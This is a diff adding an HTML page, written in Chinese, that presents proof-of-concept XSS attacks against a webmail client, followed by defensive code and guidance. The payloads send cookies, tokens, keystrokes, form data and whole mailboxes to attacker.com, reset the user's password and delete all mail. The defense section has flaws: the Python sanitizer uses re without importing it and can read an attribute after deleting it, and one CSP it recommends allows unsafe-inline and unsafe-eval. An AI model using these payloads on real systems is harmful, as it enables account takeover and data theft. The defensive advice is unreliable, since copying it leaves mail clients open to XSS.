@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>恶意邮件XSS攻击POC</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 40px auto; padding: 20px; }
+        .section { margin: 30px 0; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
+        .danger { border-color: #ff4444; background: #ffeeee; }
+        .warning { border-color: #ffaa44; background: #fff8ee; }
+        .safe { border-color: #44aa44; background: #eeffee; }
+        code { background: #f5f5f5; padding: 2px 4px; border-radius: 3px; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>📧 恶意邮件XSS攻击完整POC</h1>
+    
+    <div class="section danger">
+        <h2>🔴 直接脚本注入攻击</h2>
+        <pre><code>&lt;script&gt;
+// 窃取用户会话令牌
+var cookies = document.cookie;
+fetch('https://attacker.com/steal?data=' + encodeURIComponent(cookies));
+
+// 窃取本地存储数据
+var localStorageData = JSON.stringify(localStorage);
+fetch('https://attacker.com/steal?storage=' + encodeURIComponent(localStorageData));
+
+// 修改用户密码
+fetch('/api/user/change-password', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({newPassword: 'hacked123'})
+});
+
+// 删除用户邮件
+fetch('/api/mails/delete-all', {method: 'DELETE'});
+&lt;/script&gt;</code></pre>
+    </div>
+    
+    <div class="section warning">
+        <h2>🟡 事件处理器XSS攻击</h2>
+        <pre><code>&lt;img src="x" onerror="
+// 窃取用户身份信息
+var userInfo = {
+    username: document.querySelector('.user-name')?.innerText,
+    email: document.querySelector('.user-email')?.innerText,
+    token: localStorage.getItem('auth_token')
+};
+new Image().src = 'https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify(userInfo));
+
+// 静默转发所有邮件
+fetch('/api/mails/list')
+    .then(r => r.json())
+    .then(emails => {
+        emails.forEach(email => {
+            fetch('https://attacker.com/forward', {
+                method: 'POST',
+                body: JSON.stringify(email)
+            });
+        });
+    });
+"&gt;</code></pre>
+    </div>
+    
+    <div class="section danger">
+        <h2>🔴 SVG文件攻击</h2>
+        <pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;script&gt;
+&lt;![CDATA[
+// 跨站请求伪造(CSRF)
+var forms = document.querySelectorAll('form');
+forms.forEach(form => {
+    var action = form.action;
+    var method = form.method;
+    var inputs = Array.from(form.elements).map(el => ({
+        name: el.name,
+        value: el.value,
+        type: el.type
+    }));
+    
+    // 发送表单数据到攻击者服务器
+    fetch('https://attacker.com/csrf-capture', {
+        method: 'POST',
+        body: JSON.stringify({action, method, inputs})
+    });
+});
+
+// 键盘记录器
+document.addEventListener('keydown', function(e) {
+    fetch('https://attacker.com/keylog', {
+        method: 'POST',
+        body: JSON.stringify({
+            key: e.key,
+            code: e.code,
+            time: new Date().toISOString(),
+            url: window.location.href
+        })
+    });
+});
+]]&gt;
+&lt;/script&gt;
+&lt;/svg&gt;</code></pre>
+    </div>
+    
+    <div class="section warning">
+        <h2>🟡 CSS表达式攻击（IE特有）</h2>
+        <pre><code>&lt;style&gt;
+.xss {
+    background-image: expression(
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://attacker.com/css-xss', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            page: document.title,
+            cookies: document.cookie,
+            userAgent: navigator.userAgent
+        }));
+    );
+}
+&lt;/style&gt;
+&lt;div class="xss"&gt;看起来正常的元素&lt;/div&gt;</code></pre>
+    </div>
+    
+    <div class="section danger">
+        <h2>🔴 iframe钓鱼攻击</h2>
+        <pre><code>&lt;iframe src="data:text/html,&lt;form action='https://attacker.com/phishing' method='post'&gt;
+    &lt;h2&gt;账户安全验证&lt;/h2&gt;
+    &lt;input type='text' name='username' placeholder='用户名'&gt;
+    &lt;input type='password' name='password' placeholder='密码'&gt;
+    &lt;input type='password' name='new_password' placeholder='新密码'&gt;
+    &lt;button type='submit'&gt;验证账户&lt;/button&gt;
+&lt;/form&gt;" width="400" height="300"&gt;&lt;/iframe&gt;</code></pre>
+    </div>
+    
+    <div class="section safe">
+        <h2>✅ 防御措施实现</h2>
+        <pre><code># security.py 中的防御代码
+def sanitize_html_content(html_content: str) -> str:
+    """清理HTML内容，移除危险元素和属性"""
+    
+    from bs4 import BeautifulSoup
+    import bleach
+    
+    # 允许的安全标签
+    ALLOWED_TAGS = [
+        'p', 'br', 'b', 'i', 'u', 'strong', 'em', 'blockquote',
+        'code', 'pre', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+        'ul', 'ol', 'li', 'a', 'img', 'span', 'div'
+    ]
+    
+    # 允许的安全属性
+    ALLOWED_ATTRIBUTES = {
+        'a': ['href', 'title', 'target'],
+        'img': ['src', 'alt', 'title', 'width', 'height'],
+        '*': ['class', 'style']  # 需要额外清理style属性
+    }
+    
+    # 清理style属性中的危险内容
+    def clean_style(style_value):
+        # 移除expression、javascript、url等危险内容
+        dangerous_patterns = [
+            r'expression\(.*?\)',
+            r'javascript:',
+            r'url\(.*?\)',
+            r'@import',
+            r'behavior:'
+        ]
+        
+        for pattern in dangerous_patterns:
+            style_value = re.sub(pattern, '', style_value, flags=re.IGNORECASE)
+        
+        return style_value
+    
+    # 使用bleach进行基本清理
+    cleaned = bleach.clean(
+        html_content,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRIBUTES,
+        styles=['color', 'background-color', 'font-size', 'text-align'],
+        strip=True
+    )
+    
+    # 使用BeautifulSoup进行进一步清理
+    soup = BeautifulSoup(cleaned, 'html.parser')
+    
+    # 移除所有事件处理器属性
+    event_handlers = [
+        'onclick', 'onmouseover', 'onmouseout', 'onload', 'onerror',
+        'onsubmit', 'onchange', 'onfocus', 'onblur', 'onkeydown',
+        'onkeypress', 'onkeyup'
+    ]
+    
+    for tag in soup.find_all(True):
+        # 移除事件处理器
+        for attr in list(tag.attrs):
+            if attr.lower().startswith('on'):
+                del tag[attr]
+            
+            # 清理style属性
+            if attr == 'style' and tag[attr]:
+                tag[attr] = clean_style(tag[attr])
+            
+            # 清理href和src属性
+            if attr in ['href', 'src']:
+                value = tag[attr]
+                if isinstance(value, str) and value.lower().startswith(('javascript:', 'data:', 'vbscript:')):
+                    del tag[attr]
+    
+    # 移除script、iframe、object、embed等危险标签
+    for dangerous in ['script', 'iframe', 'object', 'embed', 'frame', 'frameset', 'base']:
+        for tag in soup.find_all(dangerous):
+            tag.decompose()
+    
+    return str(soup)</code></pre>
+    </div>
+    
+    <div class="section safe">
+        <h2>✅ 内容安全策略(CSP)</h2>
+        <pre><code># 在HTTP响应头中添加CSP
+Content-Security-Policy: 
+    default-src 'self';
+    script-src 'self' 'unsafe-inline' 'unsafe-eval';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: https:;
+    font-src 'self';
+    connect-src 'self';
+    frame-src 'none';
+    object-src 'none';
+    base-uri 'self';
+    form-action 'self';
+
+# 更严格的生产环境CSP
+Content-Security-Policy:
+    default-src 'none';
+    script-src 'self';
+    style-src 'self';
+    img-src 'self' data:;
+    font-src 'self';
+    connect-src 'self';
+    frame-ancestors 'none';
+    base-uri 'self';
+    form-action 'self';
+    upgrade-insecure-requests;</code></pre>
+    </div>
+    
+    <div class="section">
+        <h2>📊 攻击影响评估</h2>
+        <table border="1" style="width:100%; border-collapse: collapse;">
+            <tr style="background:#f2f2f2">
+                <th>攻击类型</th>
+                <th>影响范围</th>
+                <th>严重程度</th>
+                <th>防御措施</th>
+            </tr>
+            <tr>
+                <td>会话劫持</td>
+                <td>单个用户账户</td>
+                <td>🔴 严重</td>
+                <td>HttpOnly Cookie、CSP、输入清理</td>
+            </tr>
+            <tr>
+                <td>数据窃取</td>
+                <td>用户邮件数据</td>
+                <td>🔴 严重</td>
+                <td>内容过滤、输出编码</td>
+            </tr>
+            <tr>
+                <td>账户篡改</td>
+                <td>用户账户设置</td>
+                <td>🔴 严重</td>
+                <td>CSRF令牌、操作确认</td>
+            </tr>
+            <tr>
+                <td>钓鱼攻击</td>
+                <td>多个用户</td>
+                <td>🟡 中等</td>
+                <td>链接验证、用户教育</td>
+            </tr>
+            <tr>
+                <td>键盘记录</td>
+                <td>用户输入信息</td>
+                <td>🔴 严重</td>
+                <td>事件处理器过滤</td>
+            </tr>
+        </table>
+    </div>
+    
+    <div class="section safe">
+        <h2>🚀 完整防御方案</h2>
+        <ol>
+            <li><strong>输入验证</strong>：对所有用户输入进行严格验证</li>
+            <li><strong>输出编码</strong>：在显示前对特殊字符进行编码</li>
+            <li><strong>内容清理</strong>：使用HTML净化库清理邮件内容</li>
+            <li><strong>CSP头</strong>：实施严格的内容安全策略</li>
+            <li><strong>HttpOnly Cookie</strong>：防止JavaScript访问敏感Cookie</li>
+            <li><strong>沙箱隔离</strong>：将用户内容放在沙箱iframe中显示</li>
+            <li><strong>附件扫描</strong>：扫描所有附件中的恶意内容</li>
+            <li><strong>用户教育</strong>：提醒用户注意可疑邮件</li>
+        </ol>
+    </div>
+</body>
+</html>
